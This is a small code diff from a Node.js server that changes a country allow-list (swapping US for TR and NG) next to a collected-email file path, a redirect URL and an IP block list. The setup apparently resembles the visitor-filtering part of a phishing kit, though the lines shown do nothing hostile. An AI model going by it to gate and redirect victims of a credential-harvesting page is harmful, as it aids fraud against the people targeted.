@@ -13,7 +13,7 @@ const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
 const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://yourdomain.com/complete';
 
 // Allow/Block IP and Country
-const ALLOWED_COUNTRIES = ['US', 'GB', 'CA', 'UK', 'FR'];
+const ALLOWED_COUNTRIES = ['TR', 'GB', 'CA', 'NG', 'FR'];
 const BLOCKED_IPS = new Set(['192.0.2.1', '203.0.113.5']);
 
 const emailRateLimiter = new Map();
